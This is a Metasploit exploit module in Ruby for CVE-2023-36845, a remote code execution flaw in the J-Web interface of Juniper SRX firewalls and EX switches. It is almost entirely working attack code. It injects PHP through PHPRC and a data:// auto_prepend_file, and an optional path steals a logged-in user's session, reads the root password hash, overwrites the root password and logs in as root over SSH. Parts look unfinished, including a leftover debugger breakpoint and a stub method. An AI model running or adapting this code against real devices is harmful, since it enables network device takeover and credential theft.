##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'unix_crypt'
require 'net/ssh'
require 'net/ssh/command_stream'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::SSH

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Junos OS PHPRC Environment Variable Manipulation RCE',
        'Description' => %q{
          This module exploits a PHP environment variable manipulation vulnerability affecting Juniper SRX firewalls
          and EX switches. The affected Juniper devices run FreeBSD and every FreeBSD process can access their stdin
          by opening /dev/fd/0. The exploit also makes use of two useful PHP features. The first being
          'auto_prepend_file' which causes the provided file to be added using the 'require' function. The second PHP
          function is 'allow_url_include' which allows the use of URL-aware fopen wrappers. By enabling
          allow_url_include, the exploit can use any protocol wrapper with auto_prepend_file. The module then uses
          data:// to provide a file inline which includes the base64 encoded PHP payload.
        },
        'Author' => [
          'Jacob Baines', # Analysis
          'jheysel-r7',   # Msf module
          'Ron Bowes'     # Target setup instructions
        ],
        'References' => [
          [ 'URL', 'https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/'],
          [ 'URL', 'https://vulncheck.com/blog/juniper-cve-2023-36845'],
          [ 'URL', 'https://supportportal.juniper.net/s/article/2023-08-Out-of-Cycle-Security-Bulletin-Junos-OS-SRX-Series-and-EX-Series-Multiple-vulnerabilities-in-J-Web-can-be-combined-to-allow-a-preAuth-Remote-Code-Execution?language=en_US'],
          [ 'CVE', '2023-36845']
        ],
        'License' => MSF_LICENSE,
        'Platform' => %w[php unix],
        'Privileged' => false,
        'Arch' => [ARCH_PHP, ARCH_CMD] ,
        'Targets' => [
          ['Junos OS SRX Firewall / EX Switch', {}]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-08-17',
        'Notes' => {
          'Stability' => [ CRASH_SAFE, ],
          'SideEffects' => [ CONFIG_CHANGES ],
          'Reliability' => [ REPEATABLE_SESSION, ]
        }
      )
    )

    register_options([
                       OptBool.new('JAIL_BREAK', [false, 'Break out of FreeBSD jail by changing the root users password. This requires that a user is authenticated to the J-Web application in order to steal a session token, also that root logon is enabled on the device', false]),
                       OptString.new('PASSWORD', [ false, 'If JAIL_BREAK is set to true, the root users password will be temporarily changed to this password', rand_text_alphanumeric(8)]),
                       OptPort.new('SSH_PORT', [true, 'SSH port of Junos Target', 22]),
                       OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])
                     ])

  end

  def check
    non_existent_file = rand_text_alphanumeric(8..16)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'data' => "LD_PRELOAD=/tmp/#{non_existent_file}"
    )

    return CheckCode::Appears('Environment variable manipulation succeeded indicating this target is vulnerable.') if res && res.body.include?("Cannot open \"/tmp/#{non_existent_file}\"")

    CheckCode::Safe('Environment variable manipulation failed indicating this target is not vulnerable.')
  end

  def send_php_exploit(phprc, file_contents)
    post_data = "allow_url_include=1\n"
    post_data << "auto_prepend_file=\"data://text/plain;base64,#{Rex::Text.encode_base64(file_contents)}\""
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'POST',
      'data' => post_data,
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_get' => {
        'PHPRC' => phprc
      }
    )
  end

  # def on_new_session(client)
  #   super
  #
  #
  # end

  def get_php_session_id
    get_var_sess  = "<?php print_r(scandir('/var/sess'));?>"
    res = send_php_exploit('/dev/fd/0', get_var_sess)

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200

    php_session_id = res.body.scan(%r{\[\d+\] => sess_(.*)}).flatten[0]

    fail_with(Failure:: UnexpectedReply, "Failed to retrieve PHP Session ID. There might not be a user logged in at the moment which would cause this to fail.\n Try setting JAIL_BREAK to false to in order to get a session as the 'nobody' user. Or try again when a there is a user authenticated to the J-Web application.") unless php_session_id
    print_status("Found PHPSESSID: #{php_session_id}.")
    php_session_id
  end

  def get_csrf_token(php_session_id)
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/diagnose'),
      'method' => 'GET',
      'headers' =>
        {
          'Cookie' => "PHPSESSID=#{php_session_id}",
        },
      'vars_get' => {
        'm[]' => 'pinghost'
      }
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200

    csrf_token = res.get_html_document.xpath("//input[@type='hidden' and @name='csrf_token']/@value").text
    fail_with(Failure:: UnexpectedReply, "Unable to retrieve a csrf token") unless csrf_token
    print_status("Found csrf token: #{csrf_token}.")
    csrf_token
  end

  def get_encrypted_root_password(php_session_id, csrf_token)

    post_data = "rs=get_cli_data&rsargs[]=getQuery&csrf_token=#{csrf_token}&key=1"

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/jsdm/ajax/cli-editor.php'),
      'method' => 'POST',
      'data' => post_data,
      'ctype' => 'application/x-www-form-urlencoded',
      'headers' =>
        {
          'Cookie' => "PHPSESSID=#{php_session_id}",
        }
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200

    #Multple passwords are displayed in the output, we want to grab the system section first before attempting to located a password
    system_section = res.body.scan(/system \{([^}]+)\}/m).flatten[0]
    fail_with(Failure::UnexpectedReply, 'Unable to retrieve the system configuration section and thus the root password from the response') unless system_section

    encrypted_root_password = system_section.scan(/\".*\";/)
    print_status("Encrypted root password: #{encrypted_root_password}")
  end

  def set_new_root_password(php_session_id, csrf_token)

    password_hash = UnixCrypt::SHA512.build(datastore['PASSWORD'])
    puts "Password Hash: #{password_hash}"

    post_data = "&current-path=/system/root-authentication/&csrf_token=#{csrf_token}&key=1&JTK-FIELD-encrypted-password=#{password_hash}"
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, '/editor/edit/configuration/system/root-authentication'),
      'method' => 'POST',
      'data' => post_data,
      'ctype' => 'application/x-www-form-urlencoded',
      'headers' =>
        {
          'Cookie' => "PHPSESSID=#{php_session_id}",
        },
      'vars_get' => {
        'action' => 'commit'
      }
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})") unless res.code == 200

     unless res.get_html_document.xpath("//body/div[@class='commit-status' and @id='systest-commit-status-div']").text == 'Success'
       fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response (response code: #{res.code})")
     end
    print_status("Successfully changed the root user's password to #{datastore['PASSWORD']}" )
  end


  def ssh_login

    require 'pry-byebug'
    binding.pry

    ssh_opts = ssh_client_defaults.merge({
                                           port: datastore['SSH_PORT'],
                                           auth_methods: ['password'],
                                           password: datastore['PASSWORD']
                                         })

    begin
      ssh = nil
      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
        ssh = Net::SSH.start(datastore['RHOSTS'], 'root', ssh_opts)
      end
    rescue Net::SSH::Exception => e
      vprint_error("#{e.class}: #{e.message}")
      return nil
    end

    if ssh
      print_status('Creating SSH::CommandStream')
      conn = Net::SSH::CommandStream.new(ssh)
      ssh = nil
      return conn
    end

  end



  def ssh_stuff


    Net::SSH::CommandStream.new(ssh_connection)

  end

  def exploit

    if datastore['JAIL_BREAK']
      php_session_id = get_php_session_id
      csrf_token = get_csrf_token(php_session_id)
      @encrypted_root_password = get_encrypted_root_password(php_session_id, csrf_token)
      set_new_root_password(php_session_id, csrf_token)

      if (ssh = ssh_login)
        print_good("Logged in as root")
        handler(ssh.lsock)
      end

    else
      send_php_exploit('/dev/fd/0', payload.encoded)
    end

  end
end
